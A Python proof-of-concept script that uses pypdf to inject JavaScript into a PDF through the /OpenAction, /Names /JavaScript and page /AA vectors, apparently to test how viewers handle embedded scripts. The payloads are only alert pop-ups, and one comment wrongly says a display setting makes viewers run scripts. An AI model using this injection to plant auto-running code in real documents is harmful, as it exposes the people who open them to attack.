#!/usr/bin/env python3
"""PDF JavaScript injection PoC covering every action vector.

Injects all four objects that matter for PDF-resident JavaScript:

  /OpenAction   catalog-level action executed when the document opens
                (most likely to auto-run in Acrobat/Reader)
  /JavaScript   catalog /Names name-tree holding doc-level scripts
  /JS           the JavaScript string itself inside each action/script dict
  /AA           additional-actions dict (page open / close / focus events)

Every object is written as an *indirect* object so viewers can resolve it
and so it survives a save/rewrite round trip.

Usage:
    python3 generate_poc_full.py
    python3 generate_poc_full.py --make-input
"""

from __future__ import annotations

import argparse
from pathlib import Path

from pypdf import PdfReader, PdfWriter
from pypdf.generic import (
    BooleanObject,
    DictionaryObject,
    NameObject,
    TextStringObject,
)

JS_OPEN = "app.alert('OpenAction /JS fired');"
JS_NAMETREE = "app.alert('Names /JavaScript /JS fired');"
JS_AA_OPEN = "app.alert('Page /AA /O fired');"
JS_AA_CLOSE = "app.alert('Page /AA /C fired');"


def js_action(payload: str) -> DictionaryObject:
    """A JavaScript action dictionary: /S /JavaScript with /JS payload."""
    action = DictionaryObject()
    action[NameObject("/S")] = NameObject("/JavaScript")
    action[NameObject("/JS")] = TextStringObject(payload)
    return action


def make_blank_input(path: Path) -> None:
    writer = PdfWriter()
    writer.add_blank_page(width=612, height=792)
    with path.open("wb") as fh:
        writer.write(fh)


def inject(src: Path, dst: Path) -> PdfWriter:
    reader = PdfReader(str(src))
    writer = PdfWriter()

    for page in reader.pages:
        writer.add_page(page)

    # 1. /Names /JavaScript  ->  name tree entry, /JS holds the script
    writer.add_js(JS_NAMETREE)

    # 2. /OpenAction -> catalog-level JavaScript action (auto-run on open)
    open_action = writer._add_object(js_action(JS_OPEN))
    writer._root_object[NameObject("/OpenAction")] = open_action

    # 3. /AA -> additional actions on the first page (/O open, /C close)
    aa = DictionaryObject()
    aa[NameObject("/O")] = writer._add_object(js_action(JS_AA_OPEN))
    aa[NameObject("/C")] = writer._add_object(js_action(JS_AA_CLOSE))
    aa_ref = writer._add_object(aa)
    writer.pages[0][NameObject("/AA")] = aa_ref

    # Optional hardening: signal viewers to run scripts on open.
    prefs = writer.create_viewer_preferences()
    prefs[NameObject("/DisplayDocTitle")] = BooleanObject(True)

    with dst.open("wb") as fh:
        writer.write(fh)
    return writer


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--input", default="input.pdf", type=Path)
    parser.add_argument("--output", default="test-js-full.pdf", type=Path)
    parser.add_argument("--make-input", action="store_true")
    args = parser.parse_args()

    if not args.input.exists():
        if not args.make_input:
            parser.error(f"{args.input} not found (pass --make-input to generate one)")
        make_blank_input(args.input)
        print(f"created {args.input}")

    inject(args.input, args.output)
    print(f"wrote {args.output}")


if __name__ == "__main__":
    main()
